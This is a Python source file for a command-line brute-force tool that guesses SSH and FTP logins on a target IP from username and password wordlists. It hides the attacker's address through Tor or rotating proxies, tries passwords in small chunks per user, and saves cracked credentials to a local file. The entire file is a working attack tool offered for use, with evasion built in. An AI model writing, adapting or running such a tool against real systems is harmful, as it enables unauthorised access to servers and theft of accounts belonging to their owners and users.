import argparse
import time
import paramiko
from ftplib import FTP, error_perm
from colorama import Fore, init
import requests
import socks
import socket


init(autoreset=True)


def current_timestamp():
    return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"


def set_up_tor():
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")

    attempt_count = 0
    max_attempts = 3
    success = False

    while attempt_count < max_attempts:
        try:
            old_ip = get_public_ip()
            socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
            socket.socket = socks.socksocket
            new_ip = get_public_ip()
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Old IP: {Fore.LIGHTBLUE_EX}{old_ip}")
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} New IP (via Tor): {Fore.LIGHTBLUE_EX}{new_ip}")
            success = True
            break
        except socket.error:
            attempt_count += 1
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Socket error occurred during Tor setup. Attempt {attempt_count}/{max_attempts}.")

    if not success:
        print(
            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Tor initialization failed after 3 attempts, proceeding without Tor.")

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException:
        return "Unknown IP"


def load_usernames_from_file(filename):
    with open(filename, encoding='latin-1') as file:
        return file.read().splitlines()


def parse_arguments():
    parser = argparse.ArgumentParser(description='Brute force against SSH and FTP services.')
    parser.add_argument('--service', required=True, choices=['ftp', 'ssh'],
                        help="Service to attack. Choose 'ftp' or 'ssh'.")
    parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist.")
    parser.add_argument('-u', '--users', required=True, help="File containing a list of usernames.")
    parser.add_argument('--ip', required=True, type=str, help="IP address of the target.")
    parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
    parser.add_argument('--proxies', type=str, help="File containing a list of proxies.")
    return parser.parse_args()


def save_to_file(ip, service, user, password):
    with open('Credentials', 'a') as file:
        file.write(f"IP: {ip}, Service: {service}, User: {user}, Password: {password}\n")


def ssh_attack(ip, user, password, proxy_ip=None, proxy_port=None):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if proxy_ip and proxy_port:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    try:
        client.connect(ip, username=user, password=password, timeout=5)
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error with SSH: {e}")
        return False
    finally:
        client.close()


def ftp_attack(ip, user, password, proxy_ip=None, proxy_port=None):
    if proxy_ip and proxy_port:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    try:
        with FTP(ip, timeout=5) as ftp:
            ftp.login(user, password)
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
            return True
    except error_perm as e:
        if str(e).startswith('530 '):
            return False
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP error: {e}")
            return False


def handle_timeout(func, *args, **kwargs):
    retries = 2
    for _ in range(retries):
        try:
            return func(*args, **kwargs)
        except (socket.timeout, requests.ConnectionError):
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Connection timed out. Waiting for 15 seconds before retrying...")
            time.sleep(15)
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Too many timeouts. Exiting the script.")
    exit(1)


def load_proxies_from_file(filename):
    with open(filename, 'r') as file:
        return [line.strip().split(":") for line in file.readlines()]



if __name__ == '__main__':
    try:
        print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} STARTING ATTACK...")
        time.sleep(0.5)
        args = parse_arguments()

        if args.tor and args.proxies:
            print(f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET} You cannot use both Tor and a proxy file at the same time!")
            exit(1)

        if args.tor:
            handle_timeout(set_up_tor)

        proxies = []
        if args.proxies:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Loading proxies from file ....")
            proxies = load_proxies_from_file(args.proxies)

        passwords = [line.strip() for line in open(args.wordlist, 'r').readlines()]
        users = [line.strip() for line in open(args.users, 'r').readlines()]

        password_chunk_size = 3
        first_iteration = True
        proxy_idx = 0  # Index to keep track of which proxy to use

        for i in range(0, len(passwords), password_chunk_size):
            for idx, user in enumerate(users):
                # Set proxy for this user
                proxy_ip, proxy_port = proxies[proxy_idx] if proxies else (None, None)
                proxy_idx = (proxy_idx + 1) % len(proxies) if proxies else 0  # Rotate back to start if end is reached

                if proxy_ip:
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")

                if idx == 0 and not first_iteration:
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
                elif idx != 0:
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....")

                for j in range(password_chunk_size):
                    if i + j >= len(passwords):
                        break
                    password = passwords[i + j]
                    print(current_timestamp(), f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")

                    if args.service == 'ssh':
                        if handle_timeout(ssh_attack, args.ip, user, password, proxy_ip, proxy_port):
                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Password found for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
                            users.remove(user)
                            break
                    elif args.service == 'ftp':
                        if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Password found for [*]{user}{Fore.RESET}[*]: {Fore.GREEN}{password}")
                            users.remove(user)
                            break

            first_iteration = False

        print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.BLUE} Brute force completed.")
    except KeyboardInterrupt:
        print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED")
        exit(0)
